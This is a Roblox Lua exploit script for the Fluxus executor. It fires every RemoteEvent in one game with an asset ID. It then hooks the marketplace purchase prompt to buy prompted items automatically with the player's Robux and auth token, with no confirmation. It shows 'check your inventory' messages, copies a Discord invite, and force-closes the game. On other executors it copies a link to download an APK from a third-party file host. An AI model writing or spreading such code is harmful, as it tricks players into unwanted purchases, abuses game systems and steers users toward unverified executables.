if game.PlaceId ~= 110959201150720 then return end

local executor = (identifyexecutor and identifyexecutor()) or "Unknown"

if executor == "Fluxus" then
    game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)
    print("Check your Roblox inventory, thank you!")

    local cloneref = cloneref or function(...) return ... end
    local TweenService = cloneref(game:GetService("TweenService"))
    local Players = cloneref(game:GetService("Players"))
    local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
    local HttpService = cloneref(game:GetService("HttpService"))
    local MarketplaceService = cloneref(game:GetService("MarketplaceService"))
    local SoundService = cloneref(game:GetService("SoundService"))
    local player = Players.LocalPlayer

    local function playNotificationSound()
        local s = Instance.new("Sound")
        s.SoundId = "rbxassetid://8745692251"
        s.Volume = 0.5
        s.Parent = SoundService
        s:Play()
        game.Debris:AddItem(s, 3)
    end

    local function createNotification(message)
        local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
        local label = Instance.new("TextLabel", gui)
        label.Size = UDim2.new(0.5, 0, 0.1, 0)
        label.Position = UDim2.new(0.25, 0, 0.9, 0)
        label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        label.TextColor3 = Color3.fromRGB(255, 255, 255)
        label.Text = tostring(message)
        label.TextScaled = true
        label.TextTransparency = 1

        local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
        TweenService:Create(label, tweenInfo, { TextTransparency = 0 }):Play()

        task.delay(5, function()
            TweenService:Create(label, tweenInfo, { TextTransparency = 1 }):Play()
            task.wait(1)
            gui:Destroy()
        end)
    end

    local function safeToString(v)
        if typeof(v) == "table" then
            local ok, encoded = pcall(function() return HttpService:JSONEncode(v) end)
            return ok and encoded or "[Unserializable Table]"
        end
        return tostring(v)
    end

    do
        local args = {18510935632}
        local RemoteEvents = ReplicatedStorage:WaitForChild("RemoteEvents", 9e9)
        for _, remote in ipairs(RemoteEvents:GetChildren()) do
            if remote:IsA("RemoteEvent") then
                pcall(function()
                    remote:FireServer(unpack(args))
                end)
            end
        end
    end

    local function autoPurchaseUGCItem()
        local old
        old = hookmetamethod(game, "__index", function(a, b)
            task.spawn(function()
                setthreadidentity(7)
                MarketplaceService.PromptPurchaseRequestedV2:Connect(function(_, assetId, _, _, idempotencyKey, purchaseAuthToken)
                    createNotification("Prompt detected! Attempting purchase...")

                    local startTime = tick()
                    local info = MarketplaceService:GetProductInfo(assetId)
                    local success, result = pcall(function()
                        return MarketplaceService:PerformPurchase(
                            Enum.InfoType.Asset,
                            info.ProductId,
                            info.PriceInRobux,
                            HttpService:GenerateGUID(false),
                            true,
                            info.CollectibleItemId,
                            info.CollectibleProductId,
                            idempotencyKey,
                            tostring(purchaseAuthToken)
                        )
                    end)

                    if success then
                        createNotification("Purchase Success!")
                        for i, v in pairs(result) do
                            createNotification(i .. ": " .. safeToString(v))
                        end
                        local duration = tick() - startTime
                        createNotification("Bought Item in " .. string.format("%.2f", duration) .. "s")
                        
                    else
                        createNotification("Failed Purchase: " .. safeToString(result))
                    end

                    playNotificationSound()
                end)
            end)

            hookmetamethod(game, "__index", old)
            return old(a, b)
        end)
    end
    autoPurchaseUGCItem()
print("Check your Roblox inventory, thank you!")
print("Check your Roblox inventory, thank you!")
print("Check your Roblox inventory, thank you!")
print("u Will force closed this game in 10sec")
setclipboard("https://discord.gg/kBbdUqrXZY")
wait(10)
print("u Will force closed this game in 10sec")
game:Shutdown()
game.Players.LocalPlayer:kick("Alwi Hub")
else
    game:GetService("StarterGui"):SetCore("DevConsoleVisible", true)
    for _ = 1, 10 do
        setclipboard("https://webfiles.pro/file/Fluxus.apk")
        warn("Your executor is not supported. Script only works on Fluxus. (Link copied)")
    end
end
